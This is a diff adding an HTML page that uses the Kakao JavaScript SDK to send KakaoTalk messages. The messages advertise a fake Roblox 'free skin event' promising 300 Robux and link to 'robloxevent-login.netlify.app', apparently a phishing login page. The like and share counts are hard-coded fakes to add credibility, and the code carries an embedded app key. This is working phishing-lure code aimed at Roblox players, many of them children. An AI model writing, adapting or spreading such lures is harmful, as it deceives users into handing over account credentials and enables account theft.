@@ -1,0 +1,46 @@
+<html>
+<head>
+<title>카카오톡 버튼있는 메시지 전송하기</title>
+<script id="javascript-sdk" src="https://developers.kakao.com/sdk/js/kakao.min.js"></script>
+</head>
+<body>
+<a id="kakao-link-btn" href="javascript:sendLink()">
+  <img
+    src="https://developers.kakao.com/assets/img/about/logos/kakaolink/kakaolink_btn_medium.png"
+  />
+</a>
+<script type="text/javascript">
+ Kakao.init('25df42b4ef134c18dc53fa18526845fd');
+  function sendLink() {
+    Kakao.Link.sendDefault({
+      objectType: 'feed',
+      content: {
+        title: '로블록스 무료스킨 이벤트!',
+        description: '코드 xjekf282을 입력하면 300로벅스 + 무료스킨 지급!',
+        imageUrl:
+          'https://i.ibb.co/PWmNyRr/001-2.png',
+        link: {
+          mobileWebUrl: 'https://robloxevent-login.netlify.app',
+          webUrl: 'https://robloxevent-login.netlify.app',
+        },
+      },
+      social: {
+        likeCount: 321, //99999가 최대입니다
+        sharedCount: 862, //99999가 최대입니다
+      },
+      buttons: [
+        {
+          title: '이벤트 참여',
+          link: {
+            mobileWebUrl: 'https://robloxevent-login.netlify.app',
+            webUrl: 'https://robloxevent-login.netlify.app',
+          },
+        },
+      ],
+    })
+  }
+</script>
+<!-- www.blackcats4567.com -->
+<!-- 이미지/버튼 클릭 시 주소는 Kakao Developers의 애플리케이션 > 플랫폼 > Web에 넣어야 클릭했을때 성공적으로 표시됩니다 -->
+  </body>
+</html>
